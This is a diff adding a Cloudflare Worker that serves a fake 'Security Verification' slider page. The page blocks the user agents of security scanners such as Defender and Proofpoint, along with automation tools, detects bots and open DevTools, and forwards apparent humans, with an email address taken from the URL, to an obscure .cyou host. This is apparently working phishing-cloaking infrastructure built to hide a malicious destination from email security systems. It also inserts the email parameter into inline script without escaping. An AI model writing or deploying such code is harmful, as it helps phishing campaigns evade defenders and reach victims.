@@ -1,0 +1,273 @@
+// worker.js - Cloudflare Worker
+const DESTINATION = "https://cdn-k9x7m2r8q4w5-sg-east.clvgroup.cyou";
+const MIN_SCORE = 40;
+
+const BLOCK_UA = /defender|proofpoint|antivirus|scanner|crawl|bot|headless|phantom|fetch|facebook|discord|preview|proxy|spider|scraper|automation|linkpreview|puppeteer|selenium|playwright|webdriver|chrome-lighthouse|chromium|curl|wget|postman|insomnia|httpie|axios|okhttp|apache-httpclient|python|nodejs|java|php|ruby|perl|go\/|rust|dotnet|powershell/i;
+
+export default {
+  async fetch(request) {
+    const ua = request.headers.get("user-agent") || "";
+    if (BLOCK_UA.test(ua)) {
+      return new Response("Access Denied", { status: 403 });
+    }
+
+    const url = new URL(request.url);
+    const email = url.searchParams.get("email") || "test@example.com";
+
+    return new Response(generateHTML(email), {
+      headers: { "Content-Type": "text/html;charset=UTF-8" }
+    });
+  }
+};
+
+function generateHTML(email) {
+  return `<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Security Verification</title>
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{min-height:100vh;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#f1f5f9 0%,#e0e7ff 50%,#ede9fe 100%);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;padding:16px;overflow:hidden;user-select:none}
+    .orb{position:absolute;border-radius:50%;filter:blur(60px);animation:pulse 4s ease-in-out infinite}
+    .orb-1{top:10%;left:10%;width:300px;height:300px;background:rgba(196,181,253,0.4)}
+    .orb-2{bottom:10%;right:10%;width:350px;height:350px;background:rgba(165,180,252,0.4);animation-delay:1s}
+    @keyframes pulse{0%,100%{opacity:0.6;transform:scale(1)}50%{opacity:0.8;transform:scale(1.05)}}
+    .card{position:relative;background:rgba(255,255,255,0.75);backdrop-filter:blur(20px);border-radius:24px;border:1px solid rgba(255,255,255,0.6);box-shadow:0 25px 50px -12px rgba(0,0,0,0.1);padding:32px;max-width:380px;width:100%}
+    .icon-box{width:64px;height:64px;margin:0 auto 16px;border-radius:16px;background:linear-gradient(135deg,#6366f1,#8b5cf6);display:flex;align-items:center;justify-content:center;box-shadow:0 10px 25px -5px rgba(99,102,241,0.3)}
+    .icon-box svg{width:32px;height:32px;color:#fff}
+    h1{font-size:20px;font-weight:600;color:#1e293b;text-align:center;margin-bottom:4px}
+    .subtitle{font-size:14px;color:#64748b;text-align:center;margin-bottom:32px}
+    .slider-track{position:relative;height:56px;background:#f1f5f9;border-radius:28px;border:1px solid #e2e8f0;overflow:hidden;cursor:pointer}
+    .slider-fill{position:absolute;inset:0;right:auto;background:linear-gradient(90deg,#6366f1,#8b5cf6);transition:width 0.1s}
+    .slider-text{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:500;color:#94a3b8;pointer-events:none;transition:opacity 0.2s}
+    .slider-thumb{position:absolute;top:4px;left:4px;width:48px;height:48px;background:#fff;border-radius:50%;box-shadow:0 4px 15px rgba(0,0,0,0.15);display:flex;align-items:center;justify-content:center;transition:transform 0.1s,box-shadow 0.2s;cursor:grab}
+    .slider-thumb:active{cursor:grabbing;box-shadow:0 8px 25px rgba(0,0,0,0.2)}
+    .slider-thumb svg{width:20px;height:20px;color:#6366f1}
+    .spinner{width:20px;height:20px;border:2px solid #6366f1;border-top-color:transparent;border-radius:50%;animation:spin 0.8s linear infinite}
+    @keyframes spin{to{transform:rotate(360deg)}}
+    .footer{display:flex;align-items:center;justify-content:center;gap:6px;margin-top:24px;font-size:12px;color:#94a3b8}
+    .footer svg{width:12px;height:12px}
+    .success{text-align:center;padding:16px 0}
+    .success-icon{width:64px;height:64px;margin:0 auto 16px;border-radius:16px;background:#ecfdf5;display:flex;align-items:center;justify-content:center}
+    .success-icon svg{width:32px;height:32px;color:#10b981}
+    .success h2{font-size:16px;font-weight:600;color:#10b981;margin-bottom:4px}
+    .success p{font-size:14px;color:#64748b}
+    .blocked{text-align:center}
+    .blocked-icon{width:64px;height:64px;margin:0 auto 16px;border-radius:16px;background:#fef2f2;display:flex;align-items:center;justify-content:center;font-size:24px;color:#ef4444}
+    .blocked h2{font-size:18px;font-weight:600;color:#1e293b;margin-bottom:8px}
+    .blocked p{font-size:14px;color:#64748b}
+    .hidden{display:none}
+  </style>
+</head>
+<body>
+  <div class="orb orb-1"></div>
+  <div class="orb orb-2"></div>
+  
+  <div class="card">
+    <div id="main-view">
+      <div class="icon-box">
+        <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75L11.25 15 15 9.75m-3-7.036A11.959 11.959 0 013.598 6 11.99 11.99 0 003 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285z"/></svg>
+      </div>
+      <h1>Security Check</h1>
+      <p class="subtitle">Slide to verify you're human</p>
+      
+      <div class="slider-track" id="track">
+        <div class="slider-fill" id="fill"></div>
+        <div class="slider-text" id="text">Slide to verify</div>
+        <div class="slider-thumb" id="thumb">
+          <svg id="arrow" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M8.25 4.5l7.5 7.5-7.5 7.5"/></svg>
+          <div class="spinner hidden" id="spinner"></div>
+        </div>
+      </div>
+      
+      <div class="footer">
+        <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M16.5 10.5V6.75a4.5 4.5 0 10-9 0v3.75m-.75 11.25h10.5a2.25 2.25 0 002.25-2.25v-6.75a2.25 2.25 0 00-2.25-2.25H6.75a2.25 2.25 0 00-2.25 2.25v6.75a2.25 2.25 0 002.25 2.25z"/></svg>
+        <span>Protected by advanced security</span>
+      </div>
+    </div>
+    
+    <div id="success-view" class="success hidden">
+      <div class="success-icon">
+        <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75L11.25 15 15 9.75M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
+      </div>
+      <h2>Verified!</h2>
+      <p>Redirecting you now...</p>
+    </div>
+    
+    <div id="blocked-view" class="blocked hidden">
+      <div class="blocked-icon">✕</div>
+      <h2>Access Denied</h2>
+      <p>Verification could not be completed</p>
+    </div>
+  </div>
+
+<script>
+(function(){
+  const EMAIL = "${email}";
+  const DEST = "${DESTINATION}";
+  const MIN = ${MIN_SCORE};
+  
+  if(navigator.webdriver || window.phantom || !navigator.languages?.length){
+    return showBlocked();
+  }
+  
+  const S = {
+    start: Date.now(),
+    moves: 0,
+    gaps: [],
+    lastMove: 0,
+    touch: false,
+    tabAway: false,
+    devTools: false
+  };
+  
+  // Track movements
+  function onMove(){
+    S.moves++;
+    const now = Date.now();
+    if(S.lastMove) S.gaps.push(now - S.lastMove);
+    S.lastMove = now;
+    if(S.gaps.length > 25) S.gaps.shift();
+  }
+  document.addEventListener('mousemove', onMove);
+  document.addEventListener('touchmove', onMove);
+  
+  // Tab visibility
+  document.addEventListener('visibilitychange', () => {
+    if(document.hidden) S.tabAway = true;
+  });
+  
+  // DevTools detection
+  setInterval(() => {
+    if(window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160){
+      S.devTools = true;
+    }
+  }, 1000);
+  
+  // Slider logic
+  const track = document.getElementById('track');
+  const fill = document.getElementById('fill');
+  const thumb = document.getElementById('thumb');
+  const text = document.getElementById('text');
+  const arrow = document.getElementById('arrow');
+  const spinner = document.getElementById('spinner');
+  
+  let dragging = false;
+  let startX = 0;
+  let maxX = 0;
+  let progress = 0;
+  
+  function getX(e){ return e.touches ? e.touches[0].clientX : e.clientX; }
+  
+  function start(e){
+    if(e.touches) S.touch = true;
+    dragging = true;
+    startX = getX(e);
+    maxX = track.offsetWidth - 56;
+    thumb.style.transition = 'none';
+    fill.style.transition = 'none';
+  }
+  
+  function move(e){
+    if(!dragging) return;
+    const delta = getX(e) - startX;
+    progress = Math.max(0, Math.min(1, delta / maxX));
+    thumb.style.transform = 'translateX(' + (progress * maxX) + 'px)';
+    fill.style.width = (progress * 100) + '%';
+    text.style.opacity = progress > 0.3 ? 0 : 1;
+  }
+  
+  function end(){
+    if(!dragging) return;
+    dragging = false;
+    thumb.style.transition = 'transform 0.3s';
+    fill.style.transition = 'width 0.3s';
+    
+    if(progress >= 0.85){
+      verify();
+    } else {
+      progress = 0;
+      thumb.style.transform = 'translateX(0)';
+      fill.style.width = '0%';
+      text.style.opacity = 1;
+    }
+  }
+  
+  track.addEventListener('mousedown', start);
+  track.addEventListener('touchstart', start);
+  document.addEventListener('mousemove', move);
+  document.addEventListener('touchmove', move);
+  document.addEventListener('mouseup', end);
+  document.addEventListener('touchend', end);
+  
+  function verify(){
+    arrow.classList.add('hidden');
+    spinner.classList.remove('hidden');
+    text.textContent = 'Verifying...';
+    text.style.opacity = 1;
+    
+    setTimeout(() => {
+      const score = calcScore();
+      if(score < MIN){
+        showBlocked();
+      } else {
+        showSuccess();
+        setTimeout(() => {
+          window.location.replace(DEST.replace('[Email]', encodeURIComponent(EMAIL)));
+        }, 800 + Math.random() * 600);
+      }
+    }, 600);
+  }
+  
+  function calcScore(){
+    let score = 50;
+    const time = Date.now() - S.start;
+    
+    if(time < 1500) score -= 20;
+    if(time > 2500 && time < 30000) score += 10;
+    if(S.moves < 3) score -= 15;
+    if(S.moves > 10) score += 10;
+    
+    // Timing variance
+    if(S.gaps.length >= 3){
+      const avg = S.gaps.reduce((a,b) => a+b, 0) / S.gaps.length;
+      const variance = S.gaps.reduce((s,v) => s + Math.pow(v-avg,2), 0) / S.gaps.length;
+      const std = Math.sqrt(variance);
+      if(std < 15) score -= 20;
+      if(std > 50 && std < 400) score += 10;
+    }
+    
+    if(S.touch) score += 5;
+    if(S.tabAway) score -= 10;
+    if(S.devTools) score -= 25;
+    
+    if(!window.screen || screen.width === 0) score -= 15;
+    if(navigator.hardwareConcurrency > 1) score += 5;
+    if(navigator.deviceMemory > 2) score += 5;
+    
+    // Canvas test
+    try{
+      const c = document.createElement('canvas');
+      const ctx = c.getContext('2d');
+      if(ctx){ ctx.fillText('x',0,0); score += 5; }
+    } catch(e){ score -= 10; }
+    
+    return score;
+  }
+  
+  function showSuccess(){
+    document.getElementById('main-view').classList.add('hidden');
+    document.getElementById('success-view').classList.remove('hidden');
+  }
+  
+  function showBlocked(){
+    document.getElementById('main-view').classList.add('hidden');
+    document.getElementById('blocked-view').classList.remove('hidden');
+  }
+})();
+</script>
+</body>
+</html>`;
+}
